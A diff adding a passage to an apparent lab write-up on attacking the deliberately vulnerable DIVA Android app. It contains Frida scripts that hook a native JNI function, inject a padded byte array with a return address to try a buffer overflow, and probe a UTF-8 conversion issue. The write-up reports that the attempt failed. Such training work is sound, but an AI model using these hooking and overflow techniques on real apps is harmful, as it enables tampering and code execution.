@@ -284,21 +284,72 @@ tuvwxyz{|}~
 <br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 <br>And it worked perfectly
 <br>Then he created a script that allocates space in memory where to write our string in bytes to trigger the buffer overflow and replace the return value of the function with the pointer to our bytes array just created.
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
+<br>![14-56](https://teckk2.github.io/assets/images/DIVA/14-56.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {                                                                                                                                                             <br>&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")                                                                                         <br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("libdivajni address is: " + libnative_addr)
+<br>&nbsp;&nbsp;&nbsp;&nbsp;if (libnative_addr) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var string_with_jni_addr = Module.findExportByName("libdivajni.so",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"Java_jakhar_aseem_diva_DivaJni_initiateLaunchSequence")
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("DivaJni_initiateLaunchSequence address is: " + string_with_jni_addr)
+<br>&nbsp;&nbsp;&nbsp;&nbsp;};
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(string_with_jni_addr, {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(36);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
+<br>0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
+<br>0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x60, 0x4e, 0xb0, 0xee]);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(retval);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(retval);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(hexdump(retval));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;}                                                                                                                                                     <br>&nbsp;&nbsp;&nbsp;&nbsp;})                                                                                                                                                }) <br>&nbsp;&nbsp;}                                                                                                     }
+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>The result was that by pressing the red button of the app, when the return value of the function was replaced, we did not cause any buffer overflow, but it altered the operation of the app, because instead of exiting the popup with denied access, the popup with the start of the launch sequence was exited.
+<br>Well, that's good, but it wasn't the result we expected…
+<br>Let’s Confirm the **UTF8** encoding problem
+<br>Now we wanted to verify if the problem is really related to UTF8 conversion, and then KNX made this simple script that read input and print UTF8 HEX value, in this way we can compare the value that we found in EIP (that differ to what we send) with the output of this script to understand if the conversion were made is UTF8 from string
+<br>![14-57](https://teckk2.github.io/assets/images/DIVA/14-57.png)
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("libdivajni address is: " + libnative_addr)
+<br>&nbsp;&nbsp;&nbsp;&nbsp;if (libnative_addr) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var string_with_jni_addr = Module.findExportByName("libdivajni.so",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"Java_jakhar_aseem_diva_DivaJni_initiateLaunchSequence")
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("DivaJni_initiateLaunchSequence address is: " + string_with_jni_addr)
+<br>&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var SpannableStringBuilder = Java.use("android.text.SpannableStringBuilder");
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SpannableStringBuilder.toString.overload().implementation = function () {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var retval = this.toString.call(this);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("[*] SpannableStringBuilder Return: " + retval);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return '\xe7\x9f\x3e\x66';
+<br>&nbsp;&nbsp;&nbsp;&nbsp;};
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(string_with_jni_addr, {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;onEnter: function (args) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//console.log("Function args: " + args[0], args[1], args[2])
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var testo = Java.vm.getEnv().getStringUtfChars(args[2], null).readCString();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var utf8 = unescape(encodeURIComponent(testo));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var arr = [];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (var i = 0; i < utf8.length; i++) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arr.push(utf8.charCodeAt(i).toString(16));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(arr)
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;&nbsp;&nbsp;})
+<br>&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
+<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+<br>YEAH!!! It is true, and we finally found the problem.
+<br>We tried to force to return value "u03f7" and it returns cf,b7 like this conversion table which we noticed earlier also, but this time with some proper evidence:
+<br>![14-58](https://teckk2.github.io/assets/images/DIVA/14-58.png)
+<br>The idea now was to find the exact values that once encoded give us just the bytes of the address we need to write in EIP, unfortunately not all the bytes have a corresponding in UTF8 and so it was another failure.
 <br>
 <br>
 <br>
